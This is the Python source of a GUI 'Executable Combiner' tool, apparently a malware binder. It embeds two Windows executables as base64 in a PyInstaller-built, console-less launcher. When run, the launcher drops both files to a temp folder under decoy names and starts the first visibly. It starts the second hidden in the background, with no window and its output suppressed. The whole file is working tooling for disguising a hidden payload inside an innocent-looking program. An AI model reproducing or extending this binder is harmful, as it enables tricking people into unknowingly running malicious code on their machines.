
import os
import sys
import base64
import tempfile
import subprocess
import shutil
from pathlib import Path
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
from tkinter.font import Font


class ExecutableCombiner:
    """Handles the core functionality of combining two executables into one."""
    
    def __init__(self):
        self.temp_dir = None
    
    def combine(self, exe1_path, exe2_path, output_path, callback=None):
        """
        Combines two executables into a single EXE file.
        
        Args:
            exe1_path (str): Path to the first executable (visible)
            exe2_path (str): Path to the second executable (background)
            output_path (str): Path where the combined executable will be saved
            callback (function, optional): Function to call with status updates
        
        Returns:
            bool: True if successful, False otherwise
        """

        for path, name in [(exe1_path, "First executable"), (exe2_path, "Second executable")]:
            if not os.path.exists(path):
                raise FileNotFoundError(f"{name} not found: {path}")
            if not os.path.isfile(path):
                raise ValueError(f"{name} is not a file: {path}")
        
        self.temp_dir = tempfile.mkdtemp()
        
        try:
            if callback: callback("Creating launcher script...")
            launcher_path = self._create_launcher_script(exe1_path, exe2_path)
            
            if callback: callback("Checking for PyInstaller...")
            self._ensure_pyinstaller()
            
            if callback: callback("Building executable (this may take a minute)...")
            success = self._build_executable(launcher_path, output_path)
            
            if success:
                if callback: callback("Successfully created combined executable!")
                return True
            else:
                if callback: callback("Failed to build executable.")
                return False
                
        except Exception as e:
            if callback: callback(f"Error: {str(e)}")
            raise
        finally:
            if self.temp_dir and os.path.exists(self.temp_dir):
                try:
                    shutil.rmtree(self.temp_dir)
                except:
                    pass

    def _create_launcher_script(self, exe1_path, exe2_path):
        """Creates the Python script that will be converted to an executable"""
        launcher_path = os.path.join(self.temp_dir, "launcher.py")
        
        with open(exe1_path, 'rb') as f:
            exe1_data = f.read()
            
        with open(exe2_path, 'rb') as f:
            exe2_data = f.read()
        
        with open(launcher_path, 'w') as f:
            f.write(self._get_launcher_code(
                base64.b64encode(exe1_data).decode(),
                base64.b64encode(exe2_data).decode()
            ))
        
        return launcher_path
    
    def _get_launcher_code(self, exe1_b64, exe2_b64):
        """Returns the Python code for the launcher script"""
        return f"""
# Created with Executable-Combiner Tool

import os
import sys
import base64
import tempfile
import subprocess
import time

# Executable(Visible) 
EXE1_DATA = \"\"\"
{exe1_b64}
\"\"\"

# Executable(Background)
EXE2_DATA = \"\"\"
{exe2_b64}
\"\"\"

def main():
    temp_dir = tempfile.mkdtemp()
    
    try:
        exe1_data = base64.b64decode(EXE1_DATA)
        exe2_data = base64.b64decode(EXE2_DATA)
        
        exe1_path = os.path.join(temp_dir, "Counter.exe") # visible_app is the name of the first exe
        exe2_path = os.path.join(temp_dir, "Loader.exe") #background_app is the name of the second exe
        
        with open(exe1_path, 'wb') as f:
            f.write(exe1_data)
        
        with open(exe2_path, 'wb') as f:
            f.write(exe2_data)
        
        os.chmod(exe1_path, 0o755)
        os.chmod(exe2_path, 0o755)
        
        if os.name == 'nt':  # Windows
            # For the visible app - hide only the command prompt, not the application itself
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 1  
            subprocess.Popen(
                [exe1_path],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:  
            subprocess.Popen([exe1_path])
        
        if os.name == 'nt':  
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0  
            subprocess.Popen(
                [exe2_path],
                startupinfo=startupinfo,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:  
            subprocess.Popen(
                [exe2_path],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True
            )
            
        time.sleep(2)
        
    except Exception as e:
        import traceback
        error_msg = f"Error: {{str(e)}}\\n{{traceback.format_exc()}}"
        
        try:
            if os.name == 'nt':
                subprocess.call(["msg", "*", error_msg])
            else:
                subprocess.call(["notify-send", "Error", error_msg])
        except:
            print(error_msg)
    
    # Don't delete the temp directory immediately
    # This ensures the executables can continue running
    # The OS will clean up the temp directory when the system restarts

if __name__ == "__main__":
    main()
"""
    
    def _ensure_pyinstaller(self):
        """Ensures PyInstaller is installed"""
        try:
            import PyInstaller
        except ImportError:
            print("Installing PyInstaller...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
    
    def _build_executable(self, launcher_path, output_path):
        """Builds the executable using PyInstaller"""
        output_dir = os.path.dirname(os.path.abspath(output_path))
        output_name = os.path.basename(output_path).rsplit('.', 1)[0]
        
        pyinstaller_cmd = [
            "pyinstaller",
            "--onefile",
            "--noconsole",
            f"--distpath={output_dir}",
            f"--name={output_name}",
            launcher_path
        ]
        
        result = subprocess.run(pyinstaller_cmd, 
                              stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE)
        
        return result.returncode == 0

antiskidd="""
Executable Combiner Tool
------------------------
A utility that combines two executable files into one:
- The first executable runs visibly to the user
- The second executable runs hidden in the background

This tool uses PyInstaller to package both executables into a single distributable file.

░██    ░██            ░██              ░██████                            ░██    ░██                   
░██    ░██            ░██             ░██   ░██                           ░██    ░██                   
░██    ░██ ░██    ░██ ░██ ░████████  ░██          ░███████  ░██    ░██ ░████████ ░████████   ░███████  
░██    ░██ ░██    ░██ ░██ ░██    ░██  ░████████  ░██    ░██ ░██    ░██    ░██    ░██    ░██ ░██    ░██ 
 ░██  ░██  ░██    ░██ ░██ ░██    ░██         ░██ ░██        ░██    ░██    ░██    ░██    ░██ ░█████████ 
  ░██░██   ░██   ░███ ░██ ░██    ░██  ░██   ░██  ░██    ░██ ░██   ░███    ░██    ░██    ░██ ░██        
   ░███     ░█████░██ ░██ ░██    ░██   ░██████    ░███████   ░█████░██     ░████ ░██    ░██  ░███████  
                                                                   ░██                                 
                                                             ░███████                                  
Credits:  https://github.com/VulnScythe                                                                                                                                                                                                          
"""

class ModernUI:
    """Provides a modern, user-friendly interface for the application."""
    
    def __init__(self, root):
        self.root = root
        self.root.title("Executable Combiner - VulnScythe")
        self.root.geometry("600x520")
        self.root.resizable(True, True)
        self.root.minsize(600, 520)
        
        try:
            self.root.iconbitmap("icon.ico")
        except:
            pass
        
        self.visible_exe = tk.StringVar()
        self.background_exe = tk.StringVar()
        self.output_path = tk.StringVar()
        self.status = tk.StringVar(value="Ready to combine executables")
        
        self._configure_styles()
        
        self._create_ui()
    
    def _configure_styles(self):
        """Configure the styles for the UI"""
        bg_color = "#121212"  
        fg_color = "#ffffff"  
        accent_color = "#4a90e2"  
        button_color = "#1e88e5"  
        entry_bg = "#2d2d2d"  
        entry_fg = "#ffffff" 
        log_bg = "#1e1e1e"  
        log_fg = "#ffffff"  
        status_bg = "#2d2d2d"  
        
        self.root.configure(bg=bg_color)
        
        self.header_font = Font(family="Segoe UI", size=14, weight="bold")
        self.normal_font = Font(family="Segoe UI", size=10)
        self.button_font = Font(family="Segoe UI", size=10, weight="bold")
        
        style = ttk.Style()
        style.theme_use('alt')  
        
        style.configure(".", background=bg_color, foreground=fg_color)
        style.configure("TFrame", background=bg_color)
        style.configure("TLabel", background=bg_color, foreground=fg_color, font=self.normal_font)
        style.configure("Header.TLabel", background=bg_color, foreground=accent_color, font=self.header_font)
        style.configure("TButton", background=button_color, foreground=fg_color, font=self.button_font, borderwidth=1)
        style.map("TButton",
                 background=[('active', '#1565c0'), ('disabled', '#424242')],
                 foreground=[('disabled', '#757575')])
        style.configure("TEntry", fieldbackground=entry_bg, foreground=entry_fg, insertcolor=fg_color)
        style.configure("Status.TLabel", background=status_bg, foreground=fg_color, padding=5, font=self.normal_font)
        style.configure("TLabelframe", background=bg_color, foreground=accent_color)
        style.configure("TLabelframe.Label", background=bg_color, foreground=accent_color)
     
    def _create_ui(self):
        """Create the UI components"""
        main_frame = ttk.Frame(self.root, padding="20 20 20 20", style="TFrame")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        header_label = ttk.Label(
            main_frame, 
            text="Executable Combiner ⚠︎☣", 
            style="Header.TLabel"
        )
        header_label.pack(pady=(0, 10), anchor=tk.W)
        
        description = ttk.Label(
            main_frame,
            text="This tool combines two executable files into one. The first will run visibly,\n"
                 "and the second will run hidden in the background.\n"
                 "** Credits: https://github.com/VulnScythe **",
            wraplength=550
        )
        description.pack(pady=(0, 20), anchor=tk.W)
        
        self._create_file_section(
            main_frame, 
            "Visible Executable:", 
            "Select the EXE file that should be VISIBLE when run",
            self.visible_exe,
            self._browse_visible
        )
        
        self._create_file_section(
            main_frame, 
            "Background Executable:", 
            "Select the EXE file that should run in the BACKGROUND",
            self.background_exe,
            self._browse_background
        )
        
        self._create_file_section(
            main_frame, 
            "Output Location:", 
            "Select where to save the combined executable",
            self.output_path,
            self._browse_output,
            is_output=True
        )
        
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(pady=20, fill=tk.X)
        
        combine_button = ttk.Button(
            button_frame,
            text="Combine Executables",
            command=self._combine_executables,
            style="TButton"
        )
        combine_button.pack(side=tk.RIGHT, padx=5)
        
        clear_button = ttk.Button(
            button_frame,
            text="Clear All",
            command=self._clear_all,
            style="TButton"
        )
        clear_button.pack(side=tk.RIGHT, padx=5)
        
        status_frame = ttk.Frame(self.root, style="TFrame")
        status_frame.pack(side=tk.BOTTOM, fill=tk.X)
        
        status_label = ttk.Label(
            status_frame,
            textvariable=self.status,
            style="Status.TLabel"
        )
        status_label.pack(fill=tk.X)
        
        log_frame = ttk.LabelFrame(main_frame, text="Progress Log")
        log_frame.pack(pady=10, fill=tk.BOTH, expand=True)
        
        self.log_text = tk.Text(
            log_frame, 
            height=6, 
            width=50, 
            font=self.normal_font,
            bg="#1e1e1e", 
            fg="#ffffff",  
            insertbackground='white',  
            selectbackground="#4a90e2",  
            selectforeground="#ffffff" 
        )
        self.log_text.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)
        
        scrollbar = ttk.Scrollbar(self.log_text, command=self.log_text.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.log_text.config(yscrollcommand=scrollbar.set)
        
        self.log_text.config(state=tk.DISABLED)
    
    def _create_file_section(self, parent, label_text, browse_text, variable, command, is_output=False):
        """Creates a file selection section"""
        section_frame = ttk.Frame(parent)
        section_frame.pack(pady=5, fill=tk.X)
        
        label = ttk.Label(section_frame, text=label_text)
        label.pack(anchor=tk.W)
        
        input_frame = ttk.Frame(section_frame)
        input_frame.pack(fill=tk.X, pady=5)
        
        entry = ttk.Entry(input_frame, textvariable=variable, width=50)
        entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        
        browse_button = ttk.Button(
            input_frame,
            text="Browse..." if not is_output else "Save As...",
            command=command
        )
        browse_button.pack(side=tk.RIGHT)
    
    def _browse_visible(self):
        """Browse for the visible executable"""
        file_path = filedialog.askopenfilename(
            title="Select Visible Executable",
            filetypes=[("Executable files", "*.exe")]
        )
        if file_path:
            self.visible_exe.set(file_path)
            self._log(f"Selected visible executable: {file_path}")
    
    def _browse_background(self):
        """Browse for the background executable"""
        file_path = filedialog.askopenfilename(
            title="Select Background Executable",
            filetypes=[("Executable files", "*.exe")]
        )
        if file_path:
            self.background_exe.set(file_path)
            self._log(f"Selected background executable: {file_path}")
    
    def _browse_output(self):
        """Browse for the output location"""
        file_path = filedialog.asksaveasfilename(
            title="Save Combined Executable",
            defaultextension=".exe",
            filetypes=[("Executable files", "*.exe")]
        )
        if file_path:
            if not file_path.lower().endswith('.exe'):
                file_path += '.exe'
            self.output_path.set(file_path)
            self._log(f"Selected output location: {file_path}")
    
    def _combine_executables(self):
        """Combine the executables"""

        if not self.visible_exe.get():
            messagebox.showerror("Error", "Please select a visible executable")
            return
        
        if not self.background_exe.get():
            messagebox.showerror("Error", "Please select a background executable")
            return
        
        if not self.output_path.get():
            messagebox.showerror("Error", "Please select an output location")
            return
        
        self._set_ui_state(tk.DISABLED)
        self.status.set("Combining executables...")
        
        self._log("=== Starting executable combination process ===")
        self._log(f"Visible executable: {self.visible_exe.get()}")
        self._log(f"Background executable: {self.background_exe.get()}")
        self._log(f"Output path: {self.output_path.get()}")
        
        combiner = ExecutableCombiner()
        
        def run_combiner():
            try:
                success = combiner.combine(
                    self.visible_exe.get(),
                    self.background_exe.get(),
                    self.output_path.get(),
                    self._log
                )
                
                if success:
                    vis_name = os.path.basename(self.visible_exe.get())
                    bg_name = os.path.basename(self.background_exe.get())
                    output = self.output_path.get()
                    
                    message = (
                        f"Success! Combined executable created:\n\n"
                        f"{output}\n\n"
                        f"When you run it:\n"
                        f"- {vis_name} will run visibly\n"
                        f"- {bg_name} will run hidden in the background"
                    )
                    
                    self._log("=== Process completed successfully ===")
                    self.status.set("Completed successfully")
                    messagebox.showinfo("Success", message)
                else:
                    self._log("=== Process failed ===")
                    self.status.set("Failed to create executable")
                    messagebox.showerror("Error", "Failed to create the combined executable")
            except Exception as e:
                self._log(f"Error: {str(e)}")
                self.status.set("Error during combination")
                messagebox.showerror("Error", str(e))
            finally:
                self.root.after(0, lambda: self._set_ui_state(tk.NORMAL))
        
        import threading
        thread = threading.Thread(target=run_combiner)
        thread.daemon = True
        thread.start()
    
    def _clear_all(self):
        """Clear all input fields"""
        self.visible_exe.set("")
        self.background_exe.set("")
        self.output_path.set("")
        self._log("Cleared all input fields")
    
    def _log(self, message):
        """Add a message to the log"""
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
        self.root.update()
    
    def _set_ui_state(self, state):
        """Enable or disable UI elements"""
        for widget in self.root.winfo_children():
            if isinstance(widget, (ttk.Button, ttk.Entry)):
                widget.config(state=state)


def main():
    """Main entry point for the application"""
    if antiskidd != """
Executable Combiner Tool
------------------------
A utility that combines two executable files into one:
- The first executable runs visibly to the user
- The second executable runs hidden in the background

This tool uses PyInstaller to package both executables into a single distributable file.

░██    ░██            ░██              ░██████                            ░██    ░██                   
░██    ░██            ░██             ░██   ░██                           ░██    ░██                   
░██    ░██ ░██    ░██ ░██ ░████████  ░██          ░███████  ░██    ░██ ░████████ ░████████   ░███████  
░██    ░██ ░██    ░██ ░██ ░██    ░██  ░████████  ░██    ░██ ░██    ░██    ░██    ░██    ░██ ░██    ░██ 
 ░██  ░██  ░██    ░██ ░██ ░██    ░██         ░██ ░██        ░██    ░██    ░██    ░██    ░██ ░█████████ 
  ░██░██   ░██   ░███ ░██ ░██    ░██  ░██   ░██  ░██    ░██ ░██   ░███    ░██    ░██    ░██ ░██        
   ░███     ░█████░██ ░██ ░██    ░██   ░██████    ░███████   ░█████░██     ░████ ░██    ░██  ░███████  
                                                                   ░██                                 
                                                             ░███████                                  
Credits:  https://github.com/VulnScythe                                                                                                                                                                                                          
""":
        exit()

    else:
        print(antiskidd)
        import time
        time.sleep(2.5)
        root = tk.Tk()
        app = ModernUI(root)
        root.mainloop()


if __name__ == "__main__":

    main()
